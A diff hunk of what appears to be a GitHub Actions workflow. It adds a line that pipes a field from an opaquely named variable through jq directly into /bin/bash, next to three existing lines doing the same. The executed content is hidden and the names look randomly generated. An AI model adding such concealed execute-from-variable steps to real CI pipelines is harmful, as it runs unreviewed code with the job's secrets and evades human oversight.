@@ -33,6 +33,7 @@ jobs:
           echo $r678 | jq -r .bb24623 | /bin/bash
           printf '%s' "$e411" | jq -r .h735 | /bin/bash
           echo $e54058 | jq -r .u633 | /bin/bash
+          printf '%s' "$nece2" | jq -r .os843 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
